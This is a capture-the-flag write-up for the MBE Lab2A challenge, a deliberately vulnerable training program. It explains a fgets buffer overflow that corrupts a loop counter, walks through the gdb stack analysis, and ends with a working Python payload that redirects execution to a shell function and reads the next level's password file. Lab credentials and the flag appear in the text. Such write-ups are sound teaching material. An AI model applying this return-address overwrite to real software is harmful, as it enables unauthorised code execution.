---
title: "Разбор Lab2A (сложно)"
permalink: /writeups/mbe/lab2a/
excerpt: "Разбор Lab2A."
---

---
This last level is a bit tricky, but nothing to worry about! First, log into the Lab02 as **Lab2A** (`lab2A:i_c4ll_wh4t_i_w4nt_n00b`) and go to the challenges folder:

```shell
$ ssh lab2A@<VM_IP>
$ cd /levels/lab02/
```

Now we can check what this program does:

```shell
lab2A@warzone:/levels/lab02$ ./lab2A
Input 10 words:
AAAA
BBBB
CCCC
DDDD
EEEE
FFFF
GGGG
HHHH
IIII
JJJJ
Here are the first characters from the 10 words concatenated:
ABCDEFGHIJ
Not authenticated
```

Here, we have to enter 10 words, then it prints the first letter of each word. 

## Анализ исходного кода

Let's check how it looks in the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void shell()
{
    printf("You got it\n");
    system("/bin/sh");
}

void concatenate_first_chars()
{
    struct {
        char word_buf[12];
        int i;
        char* cat_pointer;
        char cat_buf[10];
    } locals;
    locals.cat_pointer = locals.cat_buf;

    printf("Input 10 words:\n");
    for(locals.i=0; locals.i!=10; locals.i++)
    {
        if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')
        {
            printf("Failed to read word\n");
            return;
        }
        *locals.cat_pointer = *locals.word_buf;
        locals.cat_pointer++;
    }

    locals.cat_buf[10] = '\0';
    printf("Here are the first characters from the 10 words concatenated:\n\
%s\n", locals.cat_buf);
}

int main(int argc, char** argv)
{
    if(argc != 1)
    {
        printf("usage:\n%s\n", argv[0]);
        return EXIT_FAILURE;
    }

    concatenate_first_chars();

    printf("Not authenticated\n");
    return EXIT_SUCCESS;
}
```

Again, there is a *shell()* function that will give us elevated privileges, but it is not called in the code. So, we will probably need to overwrite a return address somewhere in order to access it. But, where is this bug?

It's not obvious, but here is the issue :

```c
struct {
    char word_buf[12];
    int i;
    char* cat_pointer;
    char cat_buf[10];
} locals;
locals.cat_pointer = locals.cat_buf;

// Look closely...
for(locals.i=0; locals.i!=10; locals.i++)
    {
        if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')
        {
            printf("Failed to read word\n");
            return;
        }
        *locals.cat_pointer = *locals.word_buf;
        locals.cat_pointer++;
    }
```

In the *locals* structure, the size of the *word_buf* member is **12 bytes** (in decimal), but in the **if** condition, the *fgets()* function takes a size of **0x10 bytes** (16 in decimal):
- `if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')`

It means that, if we enter at least an 11-char word, **word_buf** will overflow in the **i** variable, effectively corrupting this value. By doing that, we can make the **for** loop run indefinitely because the condition `locals.i!=10` will never be met. You may be asking why **11** characters? Well, after entering 11 chars, when pressing *enter* you will add a 12th character, the *newline*. Then, *fgets()* will add a null byte after the last character in the buffer, overwriting the **i** variable.

So, what can we from here ? Well, as each loop will increase **cat_pointer** (`locals.cat_pointer++;`) to fill **cat_buf**, when **cat_buf** is full (10 bytes), it'll start overflowing on the stack which could lead to memory corruption. Now, we just need to know how many "words" we have to enter before overwriting the return address...

## Динамический анализ

Enough theory, let's try that in `gdb`. First, we need to corrupt the **i** variable in order to have an infinite loop. To find out where it is, you can place a breakpoint at `concatenate_first_chars+9` as EAX will contain the pointer to the structure:

```nasm
gdb-peda$ break *concatenate_first_chars+9
Breakpoint 1 at 0x8048726
gdb-peda$ run
Starting program: /levels/lab02/lab2A
[----------------------------------registers-----------------------------------]
EAX: 0xbffff670 --> 0x0

...[snip]...

Breakpoint 1, 0x08048726 in concatenate_first_chars ()
gdb-peda$ x/16x 0xbffff670
0xbffff670: 0x00000000  0x00c30000  0x00000001  0x0804856d
0xbffff680: 0xbffff889  0x0000002f  0x0804a000  0x08048852
0xbffff690: 0x00000001  0xbffff754  0xbffff6b8  0x080487e6
0xbffff6a0: 0xb7fcd3c4  0xb7fff000  0x0804880b  0xb7fcd000
```

Obviously, given the structure was just allocated, it only contains junk values. We can start to fill the structure with 2 random words and press **CRTRL+C** to get back to the debugger and recheck the structure.

```nasm
gdb-peda$ conti
Continuing.
Input 10 words:
AAAAA
BBBBB
^C <-- CRTL+C !!
Program received signal SIGINT, Interrupt.

...[snip]...

Legend: code, data, rodata, value
Stopped reason: SIGINT
0xb7fdbd4c in __kernel_vsyscall ()
gdb-peda$ x/16x 0xbffff670
0xbffff670: 0x42424242  0x00000a42  0x00000001  0x00000002
0xbffff680: 0xbffff686  0x00004241  0x0804a000  0x08048852
0xbffff690: 0x00000001  0xbffff754  0xbffff6b8  0x080487e6
0xbffff6a0: 0xb7fcd3c4  0xb7fff000  0x0804880b  0xb7fcd000
```

Now, if we check the address `0xbffff67c` we see the **0x00000002** value which represents the **i** variable. Here, the idea is to set a value equal or higher than **0x0a** so, if we enter 12 characters, the **i** variable will be replaced by the *newline* characters (*0xa*).

```nasm
gdb-peda$ conti
Continuing.
CCCCCCCCCCCC
^C <-- CRTL+C !!
Program received signal SIGINT, Interrupt.

...[snip]...

Stopped reason: SIGINT
0xb7fdbd4c in __kernel_vsyscall ()
gdb-peda$ x/16x 0xbffff670
0xbffff670: 0x43434343  0x43434343  0x43434343  0x0000000b
0xbffff680: 0xbffff687  0x00434241  0x0804a000  0x08048852
0xbffff690: 0x00000001  0xbffff754  0xbffff6b8  0x080487e6
0xbffff6a0: 0xb7fcd3c4  0xb7fff000  0x0804880b  0xb7fcd000
```

If we recheck the value at `0xbffff67c`, it is now set to **0x0000000b** (because the *for* loop will execute `locals.i++`). Now, the loop will run until we enter a simple line return (**\n**) as per the *if* condition (`locals.word_buf[0] == '\n'`).

The next step is to locate the return address in order to know how many words we need to enter to overwrite it. To do this, we just need to disassemble the *main()* function and see the address of the instruction called after *concatenate_first_chars()*.

```nasm
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080487b6 <+0>: push   ebp
   0x080487b7 <+1>: mov    ebp,esp
   0x080487b9 <+3>: and    esp,0xfffffff0
   0x080487bc <+6>: sub    esp,0x10
   0x080487bf <+9>: cmp    DWORD PTR [ebp+0x8],0x1
   0x080487c3 <+13>:    je     0x80487e1 <main+43>
   0x080487c5 <+15>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080487c8 <+18>:    mov    eax,DWORD PTR [eax]
   0x080487ca <+20>:    mov    DWORD PTR [esp+0x4],eax
   0x080487ce <+24>:    mov    DWORD PTR [esp],0x804890a
   0x080487d5 <+31>:    call   0x80485a0 <printf@plt>
   0x080487da <+36>:    mov    eax,0x1
   0x080487df <+41>:    jmp    0x80487f7 <main+65>
   0x080487e1 <+43>:    call   0x804871d <concatenate_first_chars> ; call to concatenate_first_chars()
   0x080487e6 <+48>:    mov    DWORD PTR [esp],0x8048915 ; return
   0x080487ed <+55>:    call   0x80485c0 <puts@plt>
   0x080487f2 <+60>:    mov    eax,0x0
   0x080487f7 <+65>:    leave
   0x080487f8 <+66>:    ret
End of assembler dump.
```

We can see that once the *concatenate_first_chars()* function return, the code will continue at `0x080487e6`. Then, if we check the stack right after the structure, we can see the return address at `0xbffff69c`:

```nasm
gdb-peda$ x/16x 0xbffff670
0xbffff670: 0x43434343  0x43434343  0x43434343  0x0000000b
0xbffff680: 0xbffff687  0x00434241  0x0804a000  0x08048852
0xbffff690: 0x00000001  0xbffff754  0xbffff6b8  0x080487e6
0xbffff6a0: 0xb7fcd3c4  0xb7fff000  0x0804880b  0xb7fcd000
```

Given the concatenation of the characters start to be stored at `0xbffff684` let's do the subtraction:

- `0xbffff69c - 0xbffff684 = 0x18` (or 24 in decimal)

We need to write *24* words before overwriting the return value. Let's write a quick proof of concept.

```nasm
gdb-peda$ r < <(python -c 'print "A" * 12 + "\n" + 23 * "A\n" + 4 * "B\n" + "\n"')
Starting program: /levels/lab02/lab2A < <(python -c 'print "A" * 12 + "\n" + 23 * "A\n" + 4 * "B\n" + "\n"')
Input 10 words:
Failed to read word

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x14
EBX: 0xb7fcd000 --> 0x1a9da8
ECX: 0xb7fd8000 ("Failed to read word\n")
EDX: 0xb7fce898 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff6a0 --> 0xb7fcd3c4 --> 0xb7fce1e0 --> 0x0
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff6a0 --> 0xb7fcd3c4 --> 0xb7fce1e0 --> 0x0
0004| 0xbffff6a4 --> 0xb7fff000 --> 0x20f34
0008| 0xbffff6a8 --> 0x804880b (<__libc_csu_init+11>:   add    ebx,0x17f5)
0012| 0xbffff6ac --> 0xb7fcd000 --> 0x1a9da8
0016| 0xbffff6b0 --> 0x8048800 (<__libc_csu_init>:  push   ebp)
0020| 0xbffff6b4 --> 0x0
0024| 0xbffff6b8 --> 0x0
0028| 0xbffff6bc --> 0xb7e3ca83 (<__libc_start_main+243>:   mov    DWORD PTR [esp],eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

Awssome, the return value is properly overwrote. Now, we just need to know the address of the *shell()* function and modify our exploit.

```nasm
gdb-peda$ disas shell
Dump of assembler code for function shell:
   0x080486fd <+0>: push   ebp
   0x080486fe <+1>: mov    ebp,esp
   0x08048700 <+3>: sub    esp,0x18
   0x08048703 <+6>: mov    DWORD PTR [esp],0x8048890
   0x0804870a <+13>:    call   0x80485c0 <puts@plt>
   0x0804870f <+18>:    mov    DWORD PTR [esp],0x804889b
   0x08048716 <+25>:    call   0x80485d0 <system@plt>
   0x0804871b <+30>:    leave  
   0x0804871c <+31>:    ret    
End of assembler dump.
```

Here, the address is `0x080486fd`.

## Решение

Let's write our exploit!

```shell
lab2A@warzone:/levels/lab02$ (python -c 'print "A" * 12 + "\n" + 23 * "A\n" + "\xfd\n\x86\n\x04\n\x08\n" + "\n"' && cat) | ./lab2A
Input 10 words:
Failed to read word
You got it
whoami
lab2end
cat /home/lab2end/.pass
D1d_y0u_enj0y_y0ur_cats?
````

Yay! You are done with **Lab02**. You can go to the next [challenge](/writeups/mbe/lab3c/)!
